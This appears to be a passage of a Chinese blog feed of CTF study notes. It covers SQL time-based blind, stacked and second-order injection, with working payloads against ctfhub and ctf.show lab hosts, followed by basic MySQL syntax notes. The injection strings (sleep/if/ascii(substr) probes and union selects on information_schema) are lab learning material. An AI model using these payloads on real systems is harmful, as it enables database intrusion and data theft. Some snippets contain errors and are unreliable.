class="headerlink" title="if(exp1,exp2,exp3)"></a>if(exp1,exp2,exp3)</h4><ol><li>当exp1的值为true时会执行exp2,否则会执行exp3</li></ol><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h5><ol><li>睡眠函数，可以使查询数据时回显数据的相应时间加长</li><li>sleep(N) 这里N是睡眠的时间</li><li>使用时可以配合if使用<pre class="line-numbers language-none"><code class="language-none">if(ascii(substr(user(),1,1)) &#x3D; 114,sleep(5),2) 这句话的意思是，如果user()中的第一个字符的ascii码为114时，睡眠5s，否则输出2，需要注意的是，这5s是在服务器的数据库中延迟的，实际情况可能会由于网络环境等因素延迟更长时间<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="benchmark函数"><a href="#benchmark函数" class="headerlink" title="benchmark函数"></a>benchmark函数</h4><ol><li>benchmark函数原本是用来重复执行某个语句的函数</li><li>benchmark(N,expression)</li><li>N是执行的次数，expression是表达式，如果需要进行盲注，通常需要进行消耗时间和性能的计算，例如哈希计算函数MD5，将MD5函数重复执行数万次则可以达到延迟的效果，而具体的情况西药根据不同比赛的服务器性能来决定</li></ol><h3 id="实现过程："><a href="#实现过程：" class="headerlink" title="实现过程："></a>实现过程：</h3><h4 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h4><ol><li><p>和1=1返回页面相同，说明不是布尔盲注，是时间盲注</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and 1&#x3D;1 --+ 页面返回有数据1&#39; and 1&#x3D;2 --+ 页面返回也有数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>判断可以使用的注入方法</p><pre class="line-numbers language-none"><code class="language-none">sleep()判断能否利用时间盲注1&#39; and sleep(5) --+ 页面延时了，则为时间盲注<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>猜数据库名称长度</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and if(length(database()) &#x3D; 10,sleep(5),1) --+ 页面延时了，则当前数据库名称长度为10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>猜测数据库名称(ASCII码)</p><pre class="line-numbers language-none"><code class="language-none">1&#39; and if(ascii(substr(database()))&#x3D;107,sleep(5),1) --+ 如果页面延时了，则第一个字符的ascii码值为107<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="逻辑判断"><a href="#逻辑判断" class="headerlink" title="逻辑判断"></a>逻辑判断</h3><ol><li>判断长度<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and if(length(database())&#x3D;8,sleep(10),1) --+ 如果页面窗口转了10s，说明长度为8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>猜测字符（<strong>数据库名</strong>第一位）<br>?id=1’ and if(mid(database(),1,1)=’s’,10,0) –+ 如果页面跳转了10s，说明database的第一个字符为s</li><li>猜测字符(<strong>猜测第一个表名</strong>的第一位)</li></ol><h3 id="例题-ctfhub时间盲注"><a href="#例题-ctfhub时间盲注" class="headerlink" title="例题:ctfhub时间盲注"></a>例题:ctfhub时间盲注</h3><ol><li>判断数据库名字长度<br><img src="https://s2.loli.net/2022/07/02/HZmto3NRM4vAlcS.png"></li><li>用二分法逐个字符判断数据库名字，例如这个地方先判断了第一个字符是s，（<strong>ascii(s) = 115</strong>）<br><img src="https://s2.loli.net/2022/07/02/ONKdQMlPenB8YoE.png"><br><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li><li>判断数据库中表的个数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(table_name) from information_schema.tables where table_schema&#x3D;&#39;sqli&#39;) &#x3D; 2,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/07/02/LxQ9gR72DrIyqTG.png"></li><li>逐个字符判断数据库中表的名字，(此处ascii(f) = 102)<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if(ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)) &#x3D; 102,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="https://s2.loli.net/2022/07/02/fOi4p3JN1MxbqGH.png"></li><li>猜测flag表的字段数<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-24d32a3bc03290f9.sandbox.ctfhub.com:10800&#x2F;?id&#x3D;1 and if((select count(column_name) from information_schema.columns where table_name &#x3D; &#39;flag&#39;) &#x3D; 1,sleep(10),0) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="堆叠注入："><a href="#堆叠注入：" class="headerlink" title="堆叠注入："></a>堆叠注入：</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><h3 id="例题：sqli-labs38"><a href="#例题：sqli-labs38" class="headerlink" title="例题：sqli-labs38"></a>例题：sqli-labs38</h3><ol><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,database() –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135428.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1) –+      得到一共四个表<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712135922.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140048.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140103.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140115.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select column_name from information_schema.columns where table_name =’users’ limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140251.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140309.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140324.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140334.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140348.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140402.png"><br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140415.png"></li><li><a href="http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;">http://ddd9132e-2976-4217-b142-ebd59320c03c.challenge.ctf.show/?id=-1&#39;</a> union select 1,2,(select group_concat(id) from security.users limit 0,1) –+<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712140627.png"></li></ol><h4 id="注意是information-schema"><a href="#注意是information-schema" class="headerlink" title="注意是information_schema"></a>注意是information_schema</h4><ol><li>是下划线不是点，命名时数字字母下划线，没有点！！！</li><li>点表示选择，而information_schema是一个表</li></ol><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>必须含有<strong>insert</strong>和<strong>update</strong>函数</li><li>变量可控<h3 id="原理：-绕过转义注入-魔术引号"><a href="#原理：-绕过转义注入-魔术引号" class="headerlink" title="原理： 绕过转义注入 魔术引号"></a>原理： <strong>绕过转义</strong>注入 魔术引号</h3></li><li>已经存储（数据库，文件）的用户输入被读取后再次进入到SQL查询语句中导致的注入</li><li>二次注入的原理，在第一次进行数据库插入数据的时候，使用了 addslashes 、get_magic_quotes_gpc、mysql_escape_string、mysql_real_escape_string等函数对其中的特殊字符进行了转义，但是addslashes有一个特点就是<strong>虽然参数在过滤后会添加 “\” 进行转义</strong>，但是<strong>“\”并不会插入到数据库中</strong>，在写入数据库的时候还是<strong>保留了原来的数据</strong>。在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中<strong>取出了脏数据</strong>，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。<br>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。</li></ol><h4 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h4><ol><li>注册用户（插入数据）：    insert xiaodi union select’</li><li>过滤：        xiaodi union select&#39;</li><li>进入数据库：  xiaodi union select’</li><li>修改用户（修改数据库中的数据）：    update xiaodi union select’ 条件=用户名是谁  xiaodi’ union select update注入</li></ol><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>插入恶意数据：进行数据库插入数据时，对其中的特殊字符进行了转义处理（<strong>转义只是为了校验</strong>），在写入数据库时又<strong>还原</strong>了原来的数据</li><li>应用恶意数据：开发者默认存入数据库中的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行下一步的校验处理</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220712142916.png"></li></ol><h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><ol><li>注册用户：insert xiaodi’</li><li>修改用户：update</li></ol><h3 id="二次注入功能点"><a href="#二次注入功能点" class="headerlink" title="二次注入功能点"></a>二次注入功能点</h3><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><h3 id="过滤函数addslashes"><a href="#过滤函数addslashes" class="headerlink" title="过滤函数addslashes"></a>过滤函数addslashes</h3><ol><li>addslashes()函数在指定的预定义字符前添加反斜杠，这些字符是：单引号（’）、双引号（”）、反斜线（\）与NUL（NULL字符）。</li><li>定义：string addslashes ( string $str )</li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="seay"><a href="#seay" class="headerlink" title="seay"></a>seay</h3><ol><li>关键字搜索，使用全局搜索,搜索可控变量或者执行函数</li><li>搜索例如select update insert 等sql语句函数，看看是否有可控变量，没有可控变量就是死sql语句，无法进行sql注入</li><li>函数查询</li><li>找到具体函数之后，右键定位函数使用的位置<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220713003157.png"></li></ol><h4 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h4><ol><li>搜索select</li><li>找到变量</li><li>找到变量调用函数</li><li>右键定位函数调用位置</li><li>看看页面和数据库的互动，根据回显判断注入点</li></ol><h4 id="判断过滤机制"><a href="#判断过滤机制" class="headerlink" title="判断过滤机制"></a>判断过滤机制</h4><ol><li>看配置文件，看配置文件的关键字，例如：fun、inc</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> sql注入 </category>
          
          <category> 手动注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 手动注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入的基本原理</title>
      <link href="/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/"/>
      <url>/%E6%AF%94%E8%B5%9B%E5%BF%85%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛必看sql注入"><a href="#比赛必看sql注入" class="headerlink" title="比赛必看sql注入"></a>比赛必看sql注入</h1><h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><ol><li>用order by后面拼接数字，确定字段数量，如果大于，则页面错误或无内容，若小于或等于，则页面正常，若错误页和正常页一样，更换报错注入/盲注</li><li>可以使用二分法来判断列的数量<h3 id="-1"><a href="#-1" class="headerlink" title=""></a></h3></li><li>判断页面回显数据的字段位置，使用union select 1,2,3```定义的数字显示在页面上，即可从中判断页面显示的字段位置<h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3></li><li>在显示的字段位置使用子查询来查询数据，或直接查询也可</li></ol><h2 id="单引号闭合问题"><a href="#单引号闭合问题" class="headerlink" title="单引号闭合问题"></a>单引号闭合问题</h2><ol><li>加入执行的语句为select * from admin where ‘$id’</li><li>如果id = 1 and 1 = 2</li><li>则会有select * from admin where ‘1 and 1 = 2’,1=2被当作字符串处理</li><li>如果id = 1’ and 1=2–+</li><li>则会有select * from admin where ‘1’ and 1=2 –+’ 闭合了，然后注释掉后面多余的单引号<h2 id="当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"><a href="#当id-1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错" class="headerlink" title="当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错"></a>当id=1’时，数字型和单引号包裹的字符型都会报错，但是双引号包裹不会报错</h2></li></ol><h2 id="判断是否有注入"><a href="#判断是否有注入" class="headerlink" title="判断是否有注入"></a>判断是否有注入</h2><ol><li>可控参数(id)的改变能否影响页面显示结果</li><li>输入的SQL语句是否能报错-能通过数据库的报错，看到数据库的一些语句痕迹</li><li>输入的SQL语句能否不报错-我们的语句能否成功闭合<h3 id="-3"><a href="#-3" class="headerlink" title=""></a></h3></li><li>?id=</li></ol><h2 id="判断是什么类型的注入"><a href="#判断是什么类型的注入" class="headerlink" title="判断是什么类型的注入"></a>判断是什么类型的注入</h2><h2 id="判断语句是否能够被恶意修改"><a href="#判断语句是否能够被恶意修改" class="headerlink" title="判断语句是否能够被恶意修改"></a>判断语句是否能够被恶意修改</h2><h2 id="是否能够成功执行"><a href="#是否能够成功执行" class="headerlink" title="是否能够成功执行"></a>是否能够成功执行</h2><h2 id="获取我们想要的数据"><a href="#获取我们想要的数据" class="headerlink" title="获取我们想要的数据"></a>获取我们想要的数据</h2><h3 id="-4"><a href="#-4" class="headerlink" title=""></a></h3><p>数据都是保存在数据库中-》表-》字段-》值</p><h2 id="mysql自带的表"><a href="#mysql自带的表" class="headerlink" title="mysql自带的表"></a>mysql自带的表</h2><h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information schema"></a>information schema</h3><ol><li>information_schema这张数据表保存了所有MYSQL服务器所有数据库的信息，例如数据库名，数据库的表，表栏的数据类型和访问权限。</li><li>schemata：提供了关于数据库的信息</li><li>tables：给出了关于数据库中表的信息</li><li>column：表中列的信息</li><li>STATISTICS表：给出了关于表索引的信息。</li><li>USER_PRIVILEGES表：给出了关于全程权限的信息。该信息源自mysql.user授权表。</li><li><img src="https://s2.loli.net/2022/05/09/2hpCTjqRuEYcDBG.png"></li><li>SCHEMA_PRIVILEGES表：给出了关于方案（数据库）权限的信息。该信息来自mysql.db授权表。</li><li><img src="https://s2.loli.net/2022/05/09/SMJ2fB4GNZYVAHx.png"></li><li>TABLE_PRIVILEGES表：给出了关于表权限的信息。该信息源自mysql.tables_priv授权表。</li><li><img src="https://s2.loli.net/2022/05/09/LTyYzAmUPCSJXgs.png"></li><li>COLUMN_PRIVILEGES表：给出了关于列权限的信息。该信息源自mysql.columns_priv授权表。</li><li>TABLE_CONSTRAINTS表：描述了存在约束的表。</li><li>KEY_COLUMN_USAGE表：描述了具有约束的键列。</li><li>VIEWS表：给出了关于数据库中的视图的信息。</li><li><a href="https://blog.csdn.net/zhang_jgang/article/details/50819142">https://blog.csdn.net/zhang_jgang/article/details/50819142</a><h4 id="information-schema中的操作"><a href="#information-schema中的操作" class="headerlink" title="information schema中的操作"></a>information schema中的操作</h4></li><li>查看库中所有的表，表名等：select * from information_schema.tables</li></ol>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
          <category> CTF </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> ing </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql操作</title>
      <link href="/mysql%E6%93%8D%E4%BD%9C/"/>
      <url>/mysql%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="mysql操作"><a href="#mysql操作" class="headerlink" title="mysql操作"></a>mysql操作</h1><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><h3 id="本质上是说这类数据库有多张表，通过关系彼此关联"><a href="#本质上是说这类数据库有多张表，通过关系彼此关联" class="headerlink" title="本质上是说这类数据库有多张表，通过关系彼此关联"></a>本质上是说这类数据库有多张表，通过关系彼此关联</h3><h2 id="sys是Mysql自己内部运行用的数据库"><a href="#sys是Mysql自己内部运行用的数据库" class="headerlink" title="sys是Mysql自己内部运行用的数据库"></a>sys是Mysql自己内部运行用的数据库</h2><h2 id="shemas"><a href="#shemas" class="headerlink" title="shemas"></a>shemas</h2><h1 id="着重号的使用："><a href="#着重号的使用：" class="headerlink" title="着重号的使用："></a>着重号的使用：</h1><ol><li>区分字段和关键字</li><li>例如：NAME本身是关键字，加``着重号后会变色，便于区分</li></ol><h3 id="tables"><a href="#tables" class="headerlink" title="tables"></a>tables</h3><ol><li>存储数据的地方<h4 id="点击最右侧的表格图标"><a href="#点击最右侧的表格图标" class="headerlink" title="点击最右侧的表格图标"></a>点击最右侧的表格图标</h4></li><li>显示出的数据每一行为一个数据，用id来唯一区分<h3 id="views"><a href="#views" class="headerlink" title="views"></a>views</h3></li><li>视图，将不同表的数据组合到一起<h3 id="stored-procedures"><a href="#stored-procedures" class="headerlink" title="stored procedures"></a>stored procedures</h3></li><li>存   储过程</li><li>用来查询数据<h3 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h3></li><li>函数</li><li>存储再数据库里的项目<h2 id="码风"><a href="#码风" class="headerlink" title="码风"></a>码风</h2></li><li>大写mysql关键字，小写其余内容</li></ol><h2 id="button"><a href="#button" class="headerlink" title="button"></a>button</h2><ol><li>Query中的execute是执行所有的sql</li></ol><h2 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h2><h3 id="use"><a href="#use" class="headerlink" title="use"></a>use</h3><ol><li>调用数据库，类似与py中的import和c++中的include<h3 id="select"><a href="#select" class="headerlink" title="select"></a>select</h3></li><li>指名想要明确获取的列</li><li>*代表所有列</li></ol><h2 id="查询常量值："><a href="#查询常量值：" class="headerlink" title="查询常量值："></a>查询常量值：</h2><ol><li>select 100;</li><li>select “name”;mysql中不区分字符和字符串的概念<h2 id="查询表达式："><a href="#查询表达式：" class="headerlink" title="查询表达式："></a>查询表达式：</h2></li><li>select 100*9;<h2 id="查询函数："><a href="#查询函数：" class="headerlink" title="查询函数："></a>查询函数：</h2></li><li>select VERSION()</li><li>调用该函数得到它的返回值</li></ol><h2 id="逻辑顺序："><a href="#逻辑顺序：" class="headerlink" title="逻辑顺序："></a>逻辑顺序：</h2><ol><li>先用from找到表</li><li>where走筛选</li><li>最后select走查询<h3 id="FROM"><a href="#FROM" class="headerlink" title="FROM"></a>FROM</h3></li><li>指名想要查询的表</li><li>select * from some_table：先库后id最后table</li><li>和py中的from random import choice 有异曲同工之处<h1 id="调用大小级关系"><a href="#调用大小级关系" class="headerlink" title="调用大小级关系"></a>调用大小级关系</h1></li><li>调用库用USE</li><li>调用列用select</li><li>调用table用FROM<h1 id="select语句"><a href="#select语句" class="headerlink" title="select语句"></a>select语句</h1></li><li>选择某一列</li><li>先后顺序根据参数的前后顺序决定</li><li>DISTINCT为消除重复项（列中参数的重复项）<h1 id="where语句"><a href="#where语句" class="headerlink" title="where语句"></a>where语句</h1></li><li>日期参数默认是year-month-date：四位year,两位month,两位date</li></ol><h2 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h2><ol><li>使用条件表达式筛选：条件运算符：&gt; &lt; = != &lt;&gt; &lt;= &gt;=</li><li>按照逻辑表达式筛选：逻辑运算符：&amp;&amp; || ! and or not </li><li>模糊查询：like; between and; in; is null;</li></ol><h2 id="参数：and-；not；-or；in-between-like-regexp"><a href="#参数：and-；not；-or；in-between-like-regexp" class="headerlink" title="参数：and ；not； or；in;between;like,regexp"></a>参数：and ；not； or；in;between;like,regexp</h2><h3 id="参数特点："><a href="#参数特点：" class="headerlink" title="参数特点："></a>参数特点：</h3><ol><li><h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4></li><li> WHERE NOT(ID != 10 AND CountryCode = “AFG”)即可产生ID != 10 AND CountryCode = “AFG”的反面<h4 id="in"><a href="#in" class="headerlink" title="in"></a>in</h4></li><li>in:简化or的写法，即WHERE Name = a OR Name = b OR Name = c == WHERE Name IN (‘a’,’b’,’c’);字符型的值必须使用单引号引起来；当某一位为下划线的时候’_’</li><li>in列表的值类型必须统一</li><li>相当于=，不能用通配符’%’和’_’<h4 id="between-and"><a href="#between-and" class="headerlink" title="between and"></a>between and</h4></li><li>between:当要将一个属性同一个范围值相比较简化AND的写法：WHERE points &gt;= 1000 AND points &lt;= 3000 == WHERE points BETWEEN 1000 AND 3000(闭区间取值);两个临界值不能颠倒（先大于等于，后小于等于）<h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4></li><li>LIKE:%表示any number of characters;_表示single character<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4></li><li>REGEXP:regular expression(正则表达式)，用异或^来表示字符串开头，用美元$来表示字符串末尾，用|来表示多个寻找，用[‘]’来表示下一个字符从某个列表中寻找，在[]中用-来表示从哪到哪（a-h即为abcdefgh）<h4 id="null"><a href="#null" class="headerlink" title="null"></a>null</h4></li><li>null不能够使用=和&lt;&gt;</li><li>ifnull(exp1,exp2):当exp1为null时将返回exp2,否则将返回exp1</li></ol><h1 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="正则表达式："></a>正则表达式：</h1><ol><li>^ beginning</li><li>$ end</li><li>| logical or</li><li>[abcd] any choice</li><li>[a-f] surrounding</li><li>&lt;=&gt; 安全等于，既可以用Null和数值等于</li></ol><h1 id="schemas中的每一个table的设置"><a href="#schemas中的每一个table的设置" class="headerlink" title="schemas中的每一个table的设置"></a>schemas中的每一个table的设置</h1><ol><li>第一行带黄色感叹号的是这张表的主键列，每一个table中都有一个</li></ol><h1 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h1><ol><li>排序，例：SELECT Name,CountryCode FROM city ORDER BY 1,2(即Name,CountryCode)</li><li>即将按照Name先排序，后按照CountryCode进行排序</li><li>asc是升序排序</li><li>desc是降序排序</li><li>SELECT * FROM employees ORDER BY salary DESC;</li><li>SELECT * FROM employees ORDER BY salary ASC;(asc可以省略)</li></ol><h1 id="limit-n"><a href="#limit-n" class="headerlink" title="limit n"></a>limit n</h1><ol><li>返回前n项<h2 id="offset-偏移量"><a href="#offset-偏移量" class="headerlink" title="offset(偏移量)"></a>offset(偏移量)</h2></li><li>limit m,n:跳过前m项数据后获取n条记录</li></ol><h1 id="内链接：同一个库中不同表格的链接"><a href="#内链接：同一个库中不同表格的链接" class="headerlink" title="内链接：同一个库中不同表格的链接"></a>内链接：同一个库中不同表格的链接</h1><ol><li>联合记录：on语句，例：JOIN customers ON orders.customer_id = customers.customer_id</li><li>加表格名前缀使列可以用，防止ambigous</li><li>使用别名避免重复，紧跟在每个表后使用别名<h1 id="跨数据库链接：不同数据库之间的链接"><a href="#跨数据库链接：不同数据库之间的链接" class="headerlink" title="跨数据库链接：不同数据库之间的链接"></a>跨数据库链接：不同数据库之间的链接</h1></li><li>未使用USE的数据库记得加上前缀</li></ol><h2 id="为字段起别名"><a href="#为字段起别名" class="headerlink" title="为字段起别名"></a>为字段起别名</h2><h3 id="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"><a href="#便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来" class="headerlink" title="便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来"></a>便于理解，如果要查询的字段有重名的情况，使用别名可以区分开来</h3><h3 id="方式1：AS"><a href="#方式1：AS" class="headerlink" title="方式1：AS"></a>方式1：AS</h3><ol><li>select 100*98 AS 替换后的名字;</li><li>select last_name AS 姓,first_name AS 名 FROM table;<h3 id="方式2：空格"><a href="#方式2：空格" class="headerlink" title="方式2：空格"></a>方式2：空格</h3></li><li>select last_name 姓，first_name 名 FROM table;</li></ol><h3 id="案例："><a href="#案例：" class="headerlink" title="案例："></a>案例：</h3><ol><li>当有空格，井号等特殊符号时需要加单双引号</li><li>SELECT salary AS “out put” FROM employees;</li></ol><h2 id="去重"><a href="#去重" class="headerlink" title="去重"></a>去重</h2><h3 id="在字段前加上字段DISTINCT"><a href="#在字段前加上字段DISTINCT" class="headerlink" title="在字段前加上字段DISTINCT"></a>在字段前加上字段DISTINCT</h3><ol><li>SELECT DISTINCT department_id FROM employees;</li></ol><h2 id="的作用"><a href="#的作用" class="headerlink" title="+的作用"></a>+的作用</h2><h3 id="仅仅只有一个功能：运算符"><a href="#仅仅只有一个功能：运算符" class="headerlink" title="仅仅只有一个功能：运算符"></a>仅仅只有一个功能：运算符</h3><h3 id="只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在"><a href="#只要有一个操作数为字符串，起连接符作用的java中-作用在mysql中不存在" class="headerlink" title="只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在"></a>只要有一个操作数为字符串，起连接符作用的java中+作用在mysql中不存在</h3><ol><li>当其中一方为字符型，试图将字符型数据转换为数值型，成功则继续做加法运算，失败则将字符型数据转换为0</li><li>SELECT ‘123’ + 90得出213</li><li>SELECT ‘join’ + 90得出90</li><li>当一方为null则结果肯定为null（没有底数怎么加都没有结果）</li></ol><h1 id="函数："><a href="#函数：" class="headerlink" title="函数："></a>函数：</h1><ol><li>隐藏了实现细节</li><li>提高了代码的重用性<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2></li><li>select 函数名(实参列表) [from 表]<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2></li><li>叫什么（函数名）</li><li>干什么（函数功能）</li></ol><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>单行函数：contact length ifnull等只有一个返回值的函数</li><li>分组函数：做统计使用，缩小返回值的量，统计函数，聚合函数，组函数<h2 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h2></li><li>SELECT CONTACT(‘a’,’b’,’c’) AS 结果;得出abc</li></ol><h1 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h1><h2 id="length（是字节长度）"><a href="#length（是字节长度）" class="headerlink" title="length（是字节长度）"></a>length（是字节长度）</h2><ol><li>select length(‘join’) 4</li><li>select length(‘张三疯hahaha’) 15(看字符集判断汉字字节长度)<h2 id="concat拼接字符串"><a href="#concat拼接字符串" class="headerlink" title="concat拼接字符串"></a>concat拼接字符串</h2></li><li>SELECT CONCAT(last_name,’-‘,first_name) FROM employees;<h2 id="upper-lower"><a href="#upper-lower" class="headerlink" title="upper,lower"></a>upper,lower</h2></li><li>SELECT UPPER(‘join’); JOIN<h3 id="实例：将姓变大写，将名变小写"><a href="#实例：将姓变大写，将名变小写" class="headerlink" title="实例：将姓变大写，将名变小写"></a>实例：将姓变大写，将名变小写</h3></li><li>SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;<h2 id="substr-substring"><a href="#substr-substring" class="headerlink" title="substr,substring"></a>substr,substring</h2><h3 id="索引从1开始"><a href="#索引从1开始" class="headerlink" title="索引从1开始"></a>索引从1开始</h3></li><li>SELECT SUBSTR(‘abcdef’,from) out_put:将从from到最后的字符选择<h3 id="截取指定长度的字符（一定是字符长度）"><a href="#截取指定长度的字符（一定是字符长度）" class="headerlink" title="截取指定长度的字符（一定是字符长度）"></a>截取指定长度的字符（一定是字符长度）</h3></li><li>SELECT SUBSTR(‘abcdef’,from,end) out_put</li></ol><h4 id="姓名用首字符大写，其他字符用小写后用——拼接"><a href="#姓名用首字符大写，其他字符用小写后用——拼接" class="headerlink" title="姓名用首字符大写，其他字符用小写后用——拼接"></a>姓名用首字符大写，其他字符用小写后用——拼接</h4><p>SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),’_’,LOWER(SUBSTR(last_name,2)));</p><h3 id="instr"><a href="#instr" class="headerlink" title="instr"></a>instr</h3><ol><li>用于返回字符的起始索引</li><li>SELECT INSTR(‘abcdef’,’def’) AS out_put</li><li>如果找不到返回0</li></ol><h2 id="trim"><a href="#trim" class="headerlink" title="trim:"></a>trim:</h2><ol><li>SELECT TRIM(‘   abcde    ‘) AS out_put</li><li>去掉字符串两侧的空格</li><li>python中是strip或者replace<h3 id="删去a"><a href="#删去a" class="headerlink" title="删去a:"></a>删去a:</h3></li><li>SELECT TRIM(‘a’ FROM ‘aaaaaaaa人名aaaaaaaaa人名aaaaa’)将删去两侧的a，中间的a不会删去</li></ol><h2 id="lpad"><a href="#lpad" class="headerlink" title="lpad"></a>lpad</h2><ol><li>用指定的字符实现左填充指定长度</li><li>SELECT LPAD(‘人名名’，10，’*’)</li></ol><h2 id="rpad"><a 